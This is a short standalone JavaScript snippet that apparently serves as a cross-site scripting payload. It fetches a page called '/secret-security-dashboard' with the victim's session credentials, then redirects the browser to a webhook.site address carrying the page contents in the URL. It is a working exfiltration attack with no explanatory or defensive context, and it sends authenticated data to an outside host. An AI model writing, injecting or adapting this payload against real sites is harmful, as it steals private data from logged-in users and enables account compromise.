(async()=>{
 let r=await fetch('/secret-security-dashboard',{credentials:'include'});
 let t=await r.text();

 location="https://webhook.site/aef63664-4b2b-4a25-a695-c21c1fdd7a89/?d="+encodeURIComponent(t.slice(0,2000));
})();